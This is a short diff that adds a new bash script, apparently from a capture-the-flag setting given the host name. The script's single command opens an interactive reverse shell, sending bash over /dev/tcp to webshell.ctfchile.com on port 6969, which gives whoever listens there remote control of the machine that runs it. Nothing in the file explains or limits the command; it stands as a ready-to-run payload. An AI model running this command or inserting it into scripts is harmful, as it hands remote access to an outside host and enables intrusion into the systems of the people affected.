@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+
+bash -c "bash -i >& /dev/tcp/webshell.ctfchile.com/6969 0>&1"
